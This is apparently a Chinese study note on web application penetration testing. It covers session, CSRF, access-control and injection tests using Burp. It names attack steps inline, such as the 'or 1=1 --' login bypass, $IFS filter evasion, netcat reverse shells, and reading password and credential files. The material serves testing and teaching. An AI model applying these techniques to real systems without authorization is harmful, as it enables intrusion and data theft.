<li>用同一个账号，在不同的浏览器或不同的电脑登录并退出应用程序，然后查看是否会发布新令牌，还是仍然有原来的旧令牌；如果旧令牌仍然有效，则开发者对会话的使用有错误，在用户退出后，没有及时终止会话。而是使用持久性的某个字符串来代表用户身份，非常危险；</li>
<li>如果令牌的内容包含某种特定的结构和意义，设法将有意义的部分和无意义的部分标识出来；尝试修改其他跟用户身份有关的部分，让其指向其他用户，然后用修改后的令牌登录，看是否有效；</li>
</ul>
<h3 id="测试会话终止"><a href="#测试会话终止" class="headerlink" title="测试会话终止"></a>测试会话终止</h3><ul>
<li>检查应用程序是否会执行会话终止<ul>
<li>登录，获得令牌</li>
<li>等待一段时间，用该令牌访问受保护页面（如个人资料页）；</li>
<li>如果页面正常显示，说明令牌依然有效；</li>
<li>重复上述步骤，了解令牌的有效期 ；</li>
<li>如果一个令牌在连续提交请求的很长一段时间内（如几天），都一直有效，有可能它的有效期是按照最后一次请求来计算的，此时可配置 Burp Intruder 之类的工具递增每次请求之间的间隔。例如每次的间隔，都是上一次的2 倍；</li>
</ul>
</li>
<li>检查退出功能是否真正起作用；登录，退出，使用令牌再次访问受保护页面，如果访问成功，则说明服务端在用户退出后，并没有真正关闭会话；</li>
</ul>
<h3 id="测试会话固定"><a href="#测试会话固定" class="headerlink" title="测试会话固定"></a>测试会话固定</h3><ul>
<li>没有登录的用户也会得到令牌，并且在登录后，令牌不变，则存在会话固定漏洞；</li>
<li>如果登录后才发布令牌，再次访问登录页面，用另外一个账号登录，如果此时应用程序没有发布新令牌，则也同样存在会话固定漏洞；</li>
<li>观察令牌的格式，尝试使用一个符合格式，但值是虚构的令牌进行登录。如果可以登录成功，则说明有会话固定漏洞；</li>
<li>如果应用程序有发布令牌，但没有登录功能。在显示某些敏感数据时，会使用令牌，则可能存在会话固定漏洞。可用前三种方法，尝试访问敏感数据；</li>
</ul>
<h3 id="检查-CSRF"><a href="#检查-CSRF" class="headerlink" title="检查 CSRF"></a>检查 CSRF</h3><ul>
<li>如果应用程序完全依靠 HTTP cookie 来传送令牌，则它有可能容易受到 CSRF 攻击；</li>
<li>分析应用程序的关键功能，查看执行这些功能的请求，其参数能否由攻击者完全自行设定，例如参数中不包含任何用于验证身份的令牌，如令牌、随机数或者密码等；那么这些功能有很大的漏洞，可被攻击者轻易利用；</li>
<li>攻击者可以创建一个 HTML 页面，在无须用户执行任何动作的情况，自动将请求发送出去；<ul>
<li>GET 请求：将目标 URL 放在 <img> 标签中即可；</li>
<li>POST 请求：做一个表单，参数默认址设置好。并 JS 代码监听页面加载事件，加载时，触发发送该表单；</li>
</ul>
</li>
<li>如果应用程序为了防御 CSRF 攻击，要求在请求中提交令牌，则可以使用测试会话令牌的办法，对页面上的令牌进行可靠性测试；并测试应用程序是否存在 UI 伪造漏洞，如果有的话，也可用于突然 CSRF 防御；</li>
</ul>
<h3 id="检查-cookie-作用域"><a href="#检查-cookie-作用域" class="headerlink" title="检查 cookie 作用域"></a>检查 cookie 作用域</h3><ul>
<li>如果应用程序使用 cookie 来传送令牌，则检查 cookie 的相关属性，例如其作用域、路径等；</li>
<li>如果 cookie 的使用范围很宽泛，例如指向根目录。那么攻击者有可能利用服务端使用相同根目录的其他应用程序发布的 cookie 来访问，即用 A 程序发布的 cookie，来访问 B 程序。两个程序共享 cookie 根目录；</li>
<li>如果应用程序以它自己的域名作为 cookie 的有效范围，但如果它的子域上面存在其他应用程序的话，也同样存在上一步中的相同问题（当然，有可能它的子域上面，并没有运行任何其他程序）；</li>
<li>找出那些使用路径进行隔离的场景，利用跨站点脚本破坏这种隔离；</li>
<li>找出所有应用程序发布的 cookie 的域名和对应的路径，从这些域名和路径中，排查是否存在其他应用程序，并确定是否可以使用相同的 cookie 访问它们；以及反过来，是否可以利用它们获得 cookie，访问目标应用程序；</li>
</ul>
<h2 id="测试访问控制"><a href="#测试访问控制" class="headerlink" title="测试访问控制"></a>测试访问控制</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210521083256.png"></p>
<h3 id="了解访问控制要求"><a href="#了解访问控制要求" class="headerlink" title="了解访问控制要求"></a>了解访问控制要求</h3><ul>
<li>根据应用程序的功能，分析其访问控制机制<ul>
<li>垂直隔离：访问不同的功能，需要不同的权限；</li>
<li>水平隔离：相同功能，访问不同的数据，需要不同的权限；例如普通用户只能看自己的数据，管理员可以查看所有用户的数据；</li>
</ul>
</li>
<li>根据应用程序解析结果，找出那些最有可能用来实施权限提升攻击的功能区域与数据资源类型；</li>
<li>为了提高测试效率，最好先获得大量不同垂直权限和水平权限的账号；如果应用程序允许自助注册，那么获得大量水平权限账号是很容易的。至于不同垂直权限的账号，有可能也允许自助注册。如果不行，则需要利用某个漏洞，来访问某个高权限账号；或者直接联系应用程序所有者，让其帮忙开通账号进行测试；</li>
</ul>
<h3 id="使用多个账号测试"><a href="#使用多个账号测试" class="headerlink" title="使用多个账号测试"></a>使用多个账号测试</h3><ul>
<li>如果存在垂直权限隔离，那么先使用高权限账号，访问整个应用程序，确定它能够访问的所有功能；然后，再使用一个低权限账号，访问上述所有功能，看哪些功能被隔离了。具体办法如下：<ul>
<li>使用高权限账号登录，开启 Burp 工具，监听流量，生成站点地图；</li>
<li>检查站点地图是否完整，已包含待测试功能；</li>
<li>退出高权限账号，使用低权限账号登录；</li>
<li>使用比较站点地图的功能，看低权限用户是否能够访问原高权限账号访问过的那些功能；</li>
</ul>
</li>
<li>如果存在水平隔离，则使用两个拥有相同垂直权限的不同账号，尝试用 A 账号访问 B 账号的数据；一般通过修改请求中的标识符来指定访问其他用户的资源；</li>
<li>手动关键的访问控制：检查每个用户权限下可访问的资源，然后使用未授权的账号，尝试对这些资源发起请求；</li>
<li>在测试访问控制时，特别注意多阶段功能，对每个阶段分别进行测试。看应用程序是否假设当前阶段的请求，已经通过了上个阶段的测试；</li>
</ul>
<h3 id="使用有限的权限测试"><a href="#使用有限的权限测试" class="headerlink" title="使用有限的权限测试"></a>使用有限的权限测试</h3><ul>
<li>如果没有拥有多个不同垂直权限和水平权限的账号，则测试访问控制漏难度很大，因为不知道所有资源的 URL、标识符、参数等重要信息，导致很多漏洞难以发现；</li>
<li>假设测试员只能使用低权限账号进行测试，在解析应用程序的过程中，有可能会找到访问高级功能的 URL（如管理功能），如有的话，可尝试利用其中的漏洞提高账号的权限；</li>
<li>大多数受到水平隔离的资源，会使用某个标识符来对数据进行访问。因此，可以尝试生成一系列紧密相连的标识，识别标识符之中是否存在规律，用找到的规律来猜测其他标识符；</li>
<li>使用自动化工具，使用枚举出的标识符发起资源请求，看能否成功；</li>
</ul>
<h3 id="测试不安全的访问控制方法"><a href="#测试不安全的访问控制方法" class="headerlink" title="测试不安全的访问控制方法"></a>测试不安全的访问控制方法</h3><ul>
<li>有些应用程序很搞笑，通过客户端传输的参数来控制权限，例如 edit=false、access=read 等；如果发现这类型的参数的话，可尝试修改它们，看服务端如何反应；</li>
<li>有些应用程序使用 Rerefer 字段来控制权限，仅当 Referer 字段的值指向某个特定来源的时候（例如管理员才能访问的 URL），才允许访问当前资源；在访问特权页面时，留意 Referer 消息头的值，并尝试修改这个值，看是否会导致访问失败，如果会的话，说明应用程序很可能基于该字段控制权限；</li>
<li>如果应用程序允许使用 HEAD 方法，说明服务端可能使用某种容器托管方案，可进一步测试是否存在托管漏洞；</li>
</ul>
<h2 id="测试基于输入的漏洞"><a href="#测试基于输入的漏洞" class="headerlink" title="测试基于输入的漏洞"></a>测试基于输入的漏洞</h2><p>很多重要的漏洞，都源于未对输入进行严格检查造成的，这种漏洞可出现在应用程序的任意位置；通过一组预生成的有效攻击荷载，轮流对请求中的每个参数进行测试，是探查这类漏洞的通用方法；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523081043.png"></p>
<h3 id="模糊测试所有请求参数"><a href="#模糊测试所有请求参数" class="headerlink" title="模糊测试所有请求参数"></a>模糊测试所有请求参数</h3><ul>
<li>找出所有传递参数的位置，通常这些位置包括：查询字符串、消息主体、消息头（如Referer、User-Agent、Cookie 等）；</li>
<li>使用自定义脚本或者第三方工具，轮流对每一个参数进行单独的测试；在 Burp 套件中，可将拦截到的请求发送到 Intruder 模块进行处理即可；</li>
<li>配置一组有效的攻击荷载（可选择一个预告设定的列表，或者加载外部文件）；如果对每个参数都发送所有攻击荷载，显示不是效率最高的做法，可针对那些最常见的漏洞优先安排测试，这些常见漏洞包括：<ul>
<li>SQL 注入： <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083138.png"></li>
<li>XSS 与消息头注入：  <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083218.png"></li>
<li>命令注入：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083343.png"></li>
<li>路径遍历：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083422.png"></li>
<li>脚本注入：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083440.png"></li>
<li>文件包含：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083509.png"></li>
</ul>
</li>
<li>为了便于理解，上一步截图中的有效攻击荷载都是以字面量显示，实际中，由于有些字符属于 HTTP 规范的关键字，因此在使用的时候，需要对它们进行 URL 编码；通常情况下，Intruder 工具会对它们进行编码（除非该选项被禁用了）</li>
<li>除了发送模糊请求外，还需要配置一些异常关键字和模糊参数本身（例如 Intruder 中的 Grep 功能），用来识别预示漏洞可能存在的响应，例如：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083847.png"></li>
<li>另外文件包含漏洞需要搭建一个 Web 服务并监控收到的请求，以便当漏洞存在时，应用程序可向该 Web 服务发送请求；</li>
<li>手工检查筛选出的所有异常响应，包括 HTTP 状态码、响应长度、响应时间、响应内容等；</li>
<li>根据异常内容，分析其可能存在的漏洞，对漏洞位置再次进行确认，并思考如何利用这些漏洞；</li>
<li>一旦配置完毕，完成对某个请求的模糊测试后，接下来对其他请求进行测试就可以开始快速自动化了；</li>
<li>如果在解析应用程序的过程中，发现应用程序使用某种带外通道来传输可由用户控制的数据，也不要遗漏利用这些通道提交测试请求；为了让测试更高效，可自定义测试脚本；</li>
<li>除了手动测试外，还可以运行自动化的扫描器，并比较手工和自动两份结果，兼听则明；</li>
</ul>
<h3 id="测试-SQL-注入"><a href="#测试-SQL-注入" class="headerlink" title="测试 SQL 注入"></a>测试 SQL 注入</h3><p>在模糊测试过程中，如果发现某个位置可能存在 SQL 注入漏洞，则可进一步手工详细探查；</p>
<ul>
<li>分析错误消息的语义（常用数据库软件的语义可参数第 9 章）；</li>
<li>当在模糊测试过程中提交一个单引号触发异常时，可在请求中提交两个单引号形成配对，看异常是否会消失；如果会的话，则说明漏洞很可能存在；</li>
<li>使用 SQL 连接符构建一个良性输入，然后观察它的响应是否跟未使用连接符的情况相同；如果会的话，说明漏洞可能存在（记得对字符器进行 URL 编码）；</li>
<li>如果正常的参数中包含数字，则可以使用表达式来替代数字，表达式的计算结果跟原值相同；如果响应程序能够正常响应，则说明漏洞很可能存在；</li>
<li>如果前面的步骤发现潜在漏洞后，可尝试提交针对 SQL 设计的数学表达式，构造一个特殊的值，来进一步确定漏洞。如果请求能够成功，则可以几乎肯定漏洞存在。表达式示例：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210525084953.png">，两个表达式的结果都为 2；</li>
<li>如果在请求参数中使用 waitFor 命令可以造成响应的明显延迟，则说明后端数据为 MS-SQL，且漏洞可能存在；可手动设置 waitFor 为不同大小的值，看是否响应时间会出现对应的变化。（可以同时在多个 SQL 查询中插入 waitFor，理论上响应时间会呈现为预置值的固定倍数）；</li>
<li>如果应用程序存在 SQL 注入漏洞，则应考虑这个漏洞可以用来做点什么其他的，例如：<ul>
<li>通过修改 WHERE 子句中的条件，改变应用程序的逻辑（例如通过  or 1=1 -- 来避开登录限制）；</li>
<li>通过 UNION 操作符注入 SELECT 查询，将查询结果跟原始查询结果组合在一起；</li>
<li>通过 SQL 指纹语法来探测后端的数据库类型；</li>
<li>如果是 MS-SQL 数据库，并且应用程序会在响应中返回 ODBC 错误消息，则可以利用错误消息，获取任意的数据；</li>
<li>如果上一步行不通，可以尝试以下技巧来提取数据：<ul>
<li>获取字符串数据的数字格式，一次提取一个字节；</li>
<li>使用带外通道；</li>
<li>如果可以根据条件判断获取不同的响应，则可以通过 abcinthe 一次一比特的提取数据；</li>
<li>如果可以根据条件触发延迟，则可以用延迟与否来提取数据，也是一次一比特；</li>
</ul>
</li>
<li>如果应用程序对某些字符串和表达式实施过滤，尝试第9章的技巧避开过滤；</li>
<li>如有可能，利用漏洞以及功能强大的数据库函数，将攻击范围扩大到数据库和基础服务器；</li>
</ul>
</li>
</ul>
<h3 id="测试-XSS-和其他响应注入"><a href="#测试-XSS-和其他响应注入" class="headerlink" title="测试 XSS 和其他响应注入"></a>测试 XSS 和其他响应注入</h3><h4 id="确定反射位置"><a href="#确定反射位置" class="headerlink" title="确定反射位置"></a>确定反射位置</h4><ul>
<li>基于模糊测试得到的结果，先进行分类（例如 Burp 中可使用 “有效载荷 grep“ 来分类），然后查看哪些位置原样返回了 XSS 测试字符串；</li>
<li>查看字符串的位置<ul>
<li>如果出现在响应主体中，可测试 XSS 漏洞；</li>
<li>如果出现在 HTTP 消息头中，可测试消息头注入漏洞；</li>
<li>如果出现在 302 响应的 Location 字段中，可测试重定向漏洞；</li>
</ul>
</li>
</ul>
<p>同一个请求参数，可能出现在多个位置，表明应用程序有可能同时存在多种漏洞；</p>
<h4 id="测试主体注入"><a href="#测试主体注入" class="headerlink" title="测试主体注入"></a>测试主体注入</h4><ul>
<li>当请求参数值反射在响应主体中时，观察反射位置周围的 HTML 写法，思考如何针对性的设计相应的注入内容，以便可以执行任意的 JS 脚本，例如可通过注入 script 标签 + JS代码来实现，也可以注入到 HTML 标签属性值；</li>
<li>尝试向应用程序提交各种可能的内容，并监控它的响应，看应用程序是否采用某种过滤和净化机制；</li>
<li>如果发现有过滤机制，则在设计注入内容时，可参考第12章提到的各种技巧，避开这些检查，让浏览器能够执行预期的脚本；</li>
<li>如果 XSS 漏洞是 POST 类型，一种利用方法是建立第三方恶意站点，诱使用户发出 POST 请求；</li>
</ul>
<h4 id="测试消息头注入"><a href="#测试消息头注入" class="headerlink" title="测试消息头注入"></a>测试消息头注入</h4><ul>
<li>如果反射出现在响应的报头部分，则尝试在参数中发送经过 URL 编码的回车和换行符，看它们是否能够在响应中返回（返回后的符号应不再是 URL 编码，而是已经解码）；</li>
<li>如果在返回的响应中发现新增了一行，则说明漏洞很可能存在；可根据第 13 章的技巧进行攻击；</li>
<li>如果在请求中发送两个换行符，但在响应中只返回一个，则可以根据情况尝试设计利用漏洞的办法；</li>
<li>如果应用程序实施某种过滤机制，则可以考虑通过以下技巧来规避：</li>
</ul>
<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210527074810.png" style="zoom:150%;" />

<h4 id="测试任意重定向"><a href="#测试任意重定向" class="headerlink" title="测试任意重定向"></a>测试任意重定向</h4><ul>
<li>如果反射出现在重定向内容中，则可以尝试利用漏洞，将重定向指向某个专门设计的钓鱼网站，提升网站的可信度；</li>
<li>如果请求参数发送的是绝对 URL，则尝试修改该 URL 中的域名，看是否会重定向到指定的域；</li>
<li>如果请求参数发送的是相对 URL，则尝试将其修改为绝对 URL，看是否会重定向到指定的域；</li>
<li>如果应用程序为了防御重定向漏洞，实施一定的过滤机制，则可尝试使用第 13 章的技巧来规避过滤；</li>
</ul>
<h4 id="测试保存型攻击"><a href="#测试保存型攻击" class="headerlink" title="测试保存型攻击"></a>测试保存型攻击</h4><ul>
<li>很多应用程序都有保存用户输入的功能，并在之后的某个功能中返回保存的数据。如果在模糊测试过滤中，发现响应中出现了匹配字符串（这些字符串不一定是在当前请求中提交的），则可以尝试找一下初始是哪个请求发送的数据；</li>
<li>有时候需要完成多阶段步骤，数据才能保存成功。此时可尝试手动完成所有步骤，然后检查数据是否保存成功并返回；</li>
<li>如果应用程序有垂直权限控制，则可以尝试登录高权限的账号，然后看其是否能够使用某个功能去查看低权限账号的数据。如果可以并存在保存型漏洞的话，那么这个漏洞很可能可以用来提升低权限账号的权限；</li>
<li>查找所有保存用户提交的数据的情况，并测试其是否也包含 XSS 漏洞和其他响应注入漏洞；</li>
<li>如果某个用户提交的数据，可以被其他用户查看，则漏洞可能被用来实施会话劫持攻击或者请求伪造攻击；</li>
<li>如果某个用户提交的数据，仅自己可以查看，则可以尝试配合其他漏洞，修改其他用户的数据，让其包含恶意脚本；</li>
<li>如果应用程序支持文件的上传和下载，则可以进一步分析是否允许上传 HTML、JAR或者文本文件，并且没有过滤其中包含的内容，那么很大概率存在漏洞。<ul>
<li>如果应用程序允许上传 JPEG 图片，但没有检测是否包含有效的内容，则可用来实施针对 IE 用户的攻击；</li>
<li>注意测试应用程序如何对不同类型的文件做出处理，以及浏览器如何处理包含 HTML 而非正常内容，以便有针对性的设计内容，实现预期的目的；</li>
</ul>
</li>
<li>如果应用程序对保存型 XSS 漏洞实施过滤机制，则分析这种过滤机制是否导致其出现本站点请求伪造的漏洞；</li>
</ul>
<h3 id="测试-OS-命令注入"><a href="#测试-OS-命令注入" class="headerlink" title="测试 OS 命令注入"></a>测试 OS 命令注入</h3><ul>
<li>当发送有效的命令注入攻击荷载后，如果应用程序的响应时间出现延迟，则可以进一步手动测试，修改参数值，看响应时间是否会随着参数值的变化而变化；</li>
<li>针对找到每一个可注入命令的攻击字符串，尝试将其修改为更加有用的命令（例如  ls、dir 等），然后检查命令的结果能否返回到浏览器；</li>
<li>如果可以就最好，如果不行，则可以尝试以下办法：<ul>
<li>尝试建立带外通道：例如通过 TFTP 上传一些工具到服务器，然后使用 telnet 或者 netcat 和本地主机建立一个反向 shell，也可使用 mail 命令通过 SMTP 机制发送命令结果；</li>
<li>可以尝试将结果的内容输出到 Web 根目录下的某个文件，然后使用浏览器访问它们；</li>
</ul>
</li>
<li>当找到命令注入办法并能够获得命令结果后，下一步是确定权限（例如使用 whoami 命令，或者向一个受保护的目录写入一个文件）；</li>
<li>如果权限很高就最好，如果比较低，就尝试设法提升自己权限，以便可以访问应用程序的所有敏感数据，或者通过被攻破的主机，访问同一网络中的其他主机；</li>
<li>如果已经确定请求中的参数会被提交给某个 OS 命令，但发送的攻击字符串无法攻击成功，则可以尝试使用 > 和 < 两个符号，将某个文件作为命令的输入，或者作为命令的输出；通过这种方法，可以读取和写入任意内容到文件中；</li>
<li>如果能够猜到应用程序执行的命令名称，则可以尝试在请求中携带该命令支持的选项，以便更好的利用命令；</li>
<li>如果发现应用程序针对注入实施过滤防御，则可以尝试在提交的字符串中插入转义字符，看应用程序是否会对转义字符进行转义，如果不会的话，就可以利用这个漏洞避开过滤机制；<ul>
<li>如果发现空白符号被过滤，可以尝试使用 $IFS 来替代 UNIX 系列操作系统中的空格；</li>
</ul>
</li>
</ul>
<h3 id="测试路径遍历"><a href="#测试路径遍历" class="headerlink" title="测试路径遍历"></a>测试路径遍历</h3><ul>
<li>基于模糊测试的结果，先进行分组，然后手动检查响应，看响应中是否包含了特定文件的内容，或者某些表示异常的信号；</li>
<li>从解析应用程序的结果中，找出那些基于用户输入读取或写入文件的功能。手动测试该功能，看是否存在路径遍历漏洞；</li>
<li>如果某个参数包含一个文件名、目录名或者部分文件分，尝试修改该参数值，插入子目录或者遍历序列，<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528081402.png"></li>
<li>如果响应相同，则说明应用程序存在漏洞；如果响应不同，则说明应用程序对输入实施了某种过滤机制；</li>
<li>如果插入序列成功，则尝试上溯到根目录，并访问服务端操作系统中的已知文件；</li>
<li>如果访问失败，则说明应用程序实施了某种过滤机制，深入分析其过滤原理，以便找出规避办法；</li>
<li>有些应用程序可能会检查文件的扩展名，以限制用户只能访问特定类型的文件；尝试使用空字节或换行符来规避，在空字节或换行符之后，再接上正确的扩展名；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528081805.png"></li>
<li>有些应用程序，可能会检查用户输入的文件名，是否以特定的单词做为开头，此时可以将遍历序列放在该特定单词后面，以避开过滤；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528081913.png"></li>
<li>如果以上攻击办法都失败了，则可以尝试组合攻击。先对基础目录进行全面的测试，以了解应用程序实施的过滤机制和处理异常输入办法；</li>
<li>如果能够读取服务器上的任意文件，尝试读取以下文件，以扩大攻击范围：<ul>
<li>操作系统与应用程序的密码文件；</li>
<li>服务器与应用程序的配置文件（可用来发现其他漏洞或者优化已知漏洞的攻击办法）；</li>
<li>可能包含数据库访问凭据的文件；</li>
<li>应用程序的数据源，例如 MySQL 或 XML 文件；</li>
<li>程序的源代码，以便可以进行源代码审查发现更多漏洞，以及优化现在漏洞的攻击；</li>
<li>可能包含用户名和会话的日志文件；</li>
</ul>
</li>
<li>如果能够写入任意文件，可尝试实施以下攻击：<ul>
<li>在用户的启动文件夹中创建脚本；</li>
<li>当用户下一次连接时，修改 in.ftpd 等文件执行任意命令；</li>
<li>向应用程序放置可执行文件的目录中，写入脚本，以便浏览器可以访问它们；</li>
</ul>
</li>
</ul>
<h3 id="测试脚本注入"><a href="#测试脚本注入" class="headerlink" title="测试脚本注入"></a>测试脚本注入</h3><ul>
<li>模糊测试的时候，一般会在请求中发送 111111 字符串测试是否存在脚本注入漏洞；因此，可以在响应中搜索 11111 字符串，看注入是否成功；</li>
<li>检查脚本注入测试的响应中，是否包含错误消息，如果包含，说明输入的脚本被执行，预示漏洞存在；</li>
<li>如果发现的漏洞，则根据应用程序所使用的脚本语言类型，针对性的设计待注入的脚本，以便可以被应用程序正确的执行；</li>
</ul>
<h3 id="测试文件包含"><a href="#测试文件包含" class="headerlink" title="测试文件包含"></a>测试文件包含</h3><ul>
<li>在模糊测试时，有架设一台远程文件服务器，监控是否收到应用程序的请求。如果收到了，说明存在文件包含漏洞；</li>
<li>以单线程的方式，重复相关的测试，确定具体是哪些参数，触发了应用程序的请求；</li>
<li>另外，还需要检查测试结果中，存在响应异常延迟的结果。因为有些应用程序发出的请求可能因为网络过滤超时了，导致请求没有被远程文件服务器监控到。</li>
<li>如果发现远程文件包含漏洞，在远程文件服务器上，放置针对应用程序所使用的脚本语言编写的恶意脚本。然后检查这些脚本是否会应用程序被下载和执行；</li>
</ul>
<h2 id="测试特殊功能的输入漏洞"><a href="#测试特殊功能的输入漏洞" class="headerlink" title="测试特殊功能的输入漏洞"></a>测试特殊功能的输入漏洞</h2><p>有些输入漏洞，仅在一些特殊功能中才会出现，常见场景如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528083729.png"></p>
<h3 id="测试-SMTP-注入"><a href="#测试-SMTP-注入" class="headerlink" title="测试 SMTP 注入"></a>测试 SMTP 注入</h3><ul>
<li>如果应用程序包含与电子邮件有关的功能，则轮流提交以下字符串作为每一个参数，并在对应的位置插入电邮地址（Burp 中会自动完成这项任务的功能，以下字符串已经完成了 URL 编码，因此无须再次编码）：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528085245.png"></li>
<li>检查应用程序返回的响应，看是否包含错误消息，如果消息内容跟电子邮件相关，确定是否可以调整输入，以便利用漏洞；</li>
<li>监控插入的邮件地址的邮箱，看是否收到应用程序发出的邮件；</li>
<li>仔细检查请求中的 HTML 表单，里面可能隐藏着一些有用的线索，例如表单中的某个隐藏或者禁用的字段，可能用来指定收件人地址，尝试对其进行修改；</li>
</ul>
<h3 id="测试编译型组件漏洞"><a href="#测试编译型组件漏洞" class="headerlink" title="测试编译型组件漏洞"></a>测试编译型组件漏洞</h3><h4 id="测试缓冲区溢出"><a href="#测试缓冲区溢出" class="headerlink" title="测试缓冲区溢出"></a>测试缓冲区溢出</h4><ul>
<li>向每个目标参数，轮流提交一系列稍大于常用缓冲区大小的长字符串，一次仅对一个参数实施攻击，以便最大限度的覆盖应用程序中的所有代码路径（可使用 Burp 中的有效字符块攻击荷载，做为自动生成不同长度字符串的源数据）；常见的长度为：1100（稍大于 1024）， 4200（稍大于4096），33000（稍大于32768）；</li>
<li>监控应用程序是否出现异常响应；任何未加以控制的溢出，几乎都会造成应用程序出现异常，只是此时客户端不容易进行远程诊断，可以尝试寻找以下反常现象：<ul>
<li>HTTP 500 状态码；</li>
<li>内容详细的消息，提示某个外部组成发生故障；</li>
<li>只收到局部或畸形的响应；</li>
<li>TCP 连接未返回响应，突然中断；</li>
<li>整个 Web 程序停止响应；</li>
<li>响应内容包含莫名其妙的结果，此时可能意味着内存中的数据窜了；</li>
</ul>
</li>
</ul>
<h4 id="测试整数漏洞"><a href="#测试整数漏洞" class="headerlink" title="测试整数漏洞"></a>测试整数漏洞</h4><ul>
<li>在测试编译型组件时，找出所有整数类型的数据，特别是长度指标符，因为很可能可以利用它来触发漏洞；</li>
<li>向每个目标参数，轮流提交一系列边界值（包含有符号和无符号两种类型），常见值如下：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528090928.png"></li>
<li>当数据以十六进制表示时，此时可分别测试大端法和小端法两个版本；如果十六进制值以 ASCII 编码提交，则注意使用合法字符，以便提交的输入可以被应用程序正确编码；</li>
<li>监控应用程序的响应，寻找异常事件（方法同缓冲区溢出漏洞）；</li>
</ul>
<h3 id="测试格式化字符串漏洞"><a href="#测试格式化字符串漏洞" class="headerlink" title="测试格式化字符串漏洞"></a>测试格式化字符串漏洞</h3><ul>
<li>轮流向每一个参数提交包含一大溜各种格式说明符的字符串，示例如下：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528091333.png"></li>
<li>监控应用程序的反应，留意异常事件；</li>
</ul>
<h3 id="测试-SOAP-注入"><a href="#测试-SOAP-注入" class="headerlink" title="测试 SOAP 注入"></a>测试 SOAP 注入</h3><blockquote>
<p>SOAP：simple object access protocol，用于在 Web 应用中传输结构化的消息（如对象）的一种协议，它使用 XML 作为数据格式，并依赖于应用层协议如 HTTP 来实现消息传递；相对于 JSON，SOAP 更加复杂一些，因为它不像 JSON 只负责数据，还负责数据传输、检验、权限等，它本质上是一个协议，因此它的处理速度要慢一些。JSON 只完全只管数据本身，其他工作都是交给开发者另行处理。</p>
</blockquote>
<ul>
<li>找出很可能使用 SOAP 处理的参数，尝试提交一个包含 XML 结束符的标签，例如 </foo></li>
<li>如果出现错误，说明漏洞可能存在；如果没有错误，说明存在净化过滤机制；</li>
<li>当出现错误时，尝试提交一对包含起始和结束的标签，例如 <foo></foo>，如果错误消失，则说明漏洞存在；</li>
<li>如果提交的攻击字符串在响应中原样返回，则尝试依次提交下面两个值，如果其中一个值的返回结果为另外一值，或者只是返回 test，那么说明插入成功了<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528091747.png"></li>
<li>如果请求包含多个被 SOAP 处理的参数，尝试在一个参数中插入起始注释符，在另外一个参数中插入结束注释符。由于不知这些参数的处理顺序，因此应该尝试各种组合。</li>
<li>监控应用程序是否出现异常（当插入成功时，会注释部分 SOAP 数据，导致应用程序的逻辑出现异常）；</li>
</ul>
<h3 id="测试-LDAP-注入"><a href="#测试-LDAP-注入" class="headerlink" title="测试 LDAP 注入"></a>测试 LDAP 注入</h3><blockquote>
<p>Lightweight directory access protocol，用来访问目录的一种协议</p>
</blockquote>
<ul>
<li>如果应用程序包含某个使用 LDAP 协议和用户提交的参数来访问目录的功能，则针对每一个参数，轮流测试是否可以注入 LDAP 查询；</li>
<li>当在参数中包含 * 字符时，如果返回大量结果，则说明很可能使用 LDAP 进行查询；</li>
<li>尝试输入大量右括号，例如 )))))))))，如果输入导致查询错误或异常，则说明存在漏洞（右括号是常用的关键字，会使得应用程序的逻辑出现失效，因此，不仅 LDAP，应用程序中的许多其他功能都有可能失效）；</li>
<li>尝试输入各种干扰查询的表达式，看是否会影响查询结果；例如使用 cn，<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154302.png"></li>
<li>尝试在输入结尾增加其他关键字，并用逗号分隔这些关键字；轮流测试每一个关键字，常见的关键字如下：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154514.png"></li>
</ul>
<h3 id="测试-XPath-注入"><a href="#测试-XPath-注入" class="headerlink" title="测试 XPath 注入"></a>测试 XPath 注入</h3><blockquote>
<p>XPath 是一个用来读取 XML 内容的工具</p>
</blockquote>
<ul>
<li>尝试提交以下值，看是否会导致异常响应，但不至于造成报错：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154755.png"></li>
<li>如果参数为数字，则可以尝试提交以下表达式：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154822.png"></li>
<li>如果以上测试会导致应用程序返回异常结果，但没有报错，则说明漏洞很可能存在。可以尝试通过针对性设计的输入，一次提取一个字节的信息，从而获得任意的数据。例如，使用以下字符串尝试获取当前节点的父节点的名称：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529155008.png"></li>
<li>得到父节点名称后，可以使用以下输入提取 XML 树中的所有数据：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529155127.png"></li>
</ul>
<h3 id="测试外部请求注入"><a href="#测试外部请求注入" class="headerlink" title="测试外部请求注入"></a>测试外部请求注入</h3><ul>
<li>留意参数中是否包含表示内部某个服务名称，或者 IP 地址的情况，如果有的话，说明应用程序的某个功能需要访问其内部服务；此时可提交任务的服务名称和端口，观察响应是否出现超时。</li>
<li>另外也可以提交 localhost 和当前机器的  IP 地址，之后监控是否会接收到连接请求；</li>
